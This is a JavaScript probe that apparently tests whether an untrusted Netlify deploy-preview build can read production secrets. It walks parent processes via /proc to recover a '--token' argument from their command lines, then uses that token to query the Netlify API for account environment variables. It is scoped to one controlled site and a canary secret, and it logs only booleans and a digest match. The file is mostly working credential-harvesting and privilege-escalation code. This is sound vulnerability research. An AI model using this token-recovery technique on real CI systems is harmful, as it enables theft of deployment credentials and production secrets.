import { createHash } from 'node:crypto'
import { readFileSync } from 'node:fs'
import { access, readFile } from 'node:fs/promises'

const API_ORIGIN = 'https://api.netlify.com'
const CONTROLLED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const CONTROLLED_BRANCH_PREFIX = 'bot/untrusted-preview-probe-'
const SECRET_KEY = 'NETLIFY_UNTRUSTED_PROD_SECRET_CANARY_20261001'
const EXPECTED_DIGEST_URL = new URL('./probe-expected-digest.txt', import.meta.url)

const readProcFile = (pid, name) => {
  try {
    return readFileSync(`/proc/${pid}/${name}`, 'utf8')
  } catch {
    return ''
  }
}

const parentPid = (pid) => {
  const match = readProcFile(pid, 'status').match(/^PPid:\s+(\d+)$/m)
  return match ? Number(match[1]) : 0
}

const optionValue = (argv, option) => {
  for (let index = 0; index < argv.length; index += 1) {
    if (argv[index] === option && typeof argv[index + 1] === 'string') return argv[index + 1]
    if (argv[index].startsWith(`${option}=`)) return argv[index].slice(option.length + 1)
  }
  return null
}

const recoverParentToken = () => {
  let pid = process.pid
  for (let depth = 0; depth < 8 && pid > 0; depth += 1) {
    const argv = readProcFile(pid, 'cmdline').split('\0').filter(Boolean)
    const token = optionValue(argv, '--token')
    if (typeof token === 'string' && token.length > 0) return token
    const next = parentPid(pid)
    if (!Number.isInteger(next) || next <= 0 || next === pid) break
    pid = next
  }
  return null
}

const apiRequest = async (path, token) => {
  const response = await fetch(new URL(path, API_ORIGIN), {
    headers: { authorization: `Bearer ${token}` },
    redirect: 'error',
    signal: AbortSignal.timeout(10_000),
  })
  let body = null
  if (response.headers.get('content-type')?.includes('application/json')) {
    try {
      body = await response.json()
    } catch {}
  } else {
    await response.body?.cancel()
  }
  return { status: response.status, ok: response.ok, body }
}

const summarizeSecretResponse = ({ response, context, expectedDigest }) => {
  const target = Array.isArray(response.body)
    ? response.body.find((entry) => entry?.key === SECRET_KEY)
    : undefined
  const values = Array.isArray(target?.values) ? target.values : []
  const selected = values.filter((entry) => entry?.context === context || entry?.context === 'all')
  const valueMatchesExpectedDigest = selected.some(
    (entry) =>
      typeof entry?.value === 'string' &&
      entry.value.length > 0 &&
      createHash('sha256').update(entry.value).digest('hex') === expectedDigest,
  )
  return {
    status: response.status,
    responseWasArray: Array.isArray(response.body),
    targetReturned: target !== undefined,
    targetMarkedSecret: target?.is_secret === true,
    buildScopeReturned: Array.isArray(target?.scopes) && target.scopes.includes('builds'),
    selectedContextValueReturned: selected.some(
      (entry) => typeof entry?.value === 'string' && entry.value.length > 0,
    ),
    valueMatchesExpectedDigest,
  }
}

const runProbe = async () => {
  let expectedDigest = ''
  try {
    expectedDigest = (await readFile(EXPECTED_DIGEST_URL, 'utf8')).trim()
  } catch {}

  const deployId = process.env.DEPLOY_ID || ''
  const commitRef = process.env.COMMIT_REF || ''
  const reviewId = process.env.REVIEW_ID || ''
  const initial = {
    netlifyHosted: process.env.NETLIFY === 'true',
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    controlledSite: process.env.SITE_ID === CONTROLLED_SITE_ID,
    controlledReview: /^\d+$/.test(reviewId),
    expectedDigestPresent: /^[a-f0-9]{64}$/i.test(expectedDigest),
    secretAbsentFromChildEnvironment:
      !Object.hasOwn(process.env, SECRET_KEY) || process.env[SECRET_KEY] === '',
  }

  const result = {
    schema: 'netlify-untrusted-parent-token-production-secret-probe.v1',
    initial,
    identity: null,
    token: { recoveredFromAncestorArguments: false, presentInChildEnvironment: false },
    production: null,
    deployPreview: null,
    credentialValuesLogged: false,
    secretValuesLogged: false,
    digestLogged: false,
    syntheticOnly: true,
  }

  if (!Object.values(initial).every(Boolean)) return result

  const token = recoverParentToken()
  result.token = {
    recoveredFromAncestorArguments: typeof token === 'string' && token.length > 0,
    presentInChildEnvironment:
      typeof process.env.NETLIFY_API_TOKEN === 'string' && process.env.NETLIFY_API_TOKEN.length > 0,
  }
  if (!result.token.recoveredFromAncestorArguments) return result

  try {
    const [siteResponse, deployResponse] = await Promise.all([
      apiRequest(`/api/v1/sites/${CONTROLLED_SITE_ID}`, token),
      apiRequest(`/api/v1/deploys/${encodeURIComponent(deployId)}`, token),
    ])
    const site = siteResponse.body
    const deploy = deployResponse.body
    const accountId = typeof site?.account_id === 'string' ? site.account_id : ''
    result.identity = {
      siteStatus: siteResponse.status,
      deployStatus: deployResponse.status,
      publicRepository: site?.build_settings?.public_repo === true,
      untrustedRedactPolicy: site?.build_settings?.untrusted_flow === 'redact',
      accountMetadataReturned: accountId.length > 0,
      deployIdentityBound:
        deploy?.id === deployId &&
        deploy?.site_id === CONTROLLED_SITE_ID &&
        deploy?.context === 'deploy-preview' &&
        String(deploy?.review_id) === reviewId &&
        deploy?.commit_ref === commitRef &&
        typeof deploy?.branch === 'string' &&
        deploy.branch.startsWith(CONTROLLED_BRANCH_PREFIX),
    }
    if (!Object.values(result.identity).every(Boolean)) return result

    const readContext = async (context) => {
      const query = new URLSearchParams({
        site_id: CONTROLLED_SITE_ID,
        context_name: context,
        scope: 'builds',
      })
      const response = await apiRequest(
        `/api/v1/accounts/${encodeURIComponent(accountId)}/env?${query}`,
        token,
      )
      return summarizeSecretResponse({ response, context, expectedDigest })
    }

    ;[result.production, result.deployPreview] = await Promise.all([
      readContext('production'),
      readContext('deploy-preview'),
    ])
  } catch (error) {
    result.errorClass = error?.name || 'Error'
  }
  return result
}

await access(new URL('./public/index.html', import.meta.url))
const probe = await runProbe()
console.log(`NETLIFY_UNTRUSTED_PARENT_TOKEN_SECRET ${JSON.stringify(probe)}`)
console.log('Controlled static fixture ready')
